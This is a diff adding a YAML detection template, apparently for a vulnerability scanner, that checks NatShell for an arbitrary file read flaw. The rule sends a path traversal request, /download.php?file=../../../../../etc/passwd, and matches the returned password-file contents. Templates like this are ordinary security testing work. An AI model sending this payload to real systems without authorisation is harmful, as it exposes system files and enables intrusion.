@@ -1,0 +1,12 @@
+name: poc-yaml-natshell-arbitrary-file-read
+rules:
+  - method: GET
+    path: /download.php?file=../../../../../etc/passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "(root|toor):[x*]:0:0:".bmatches(response.body)
+
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
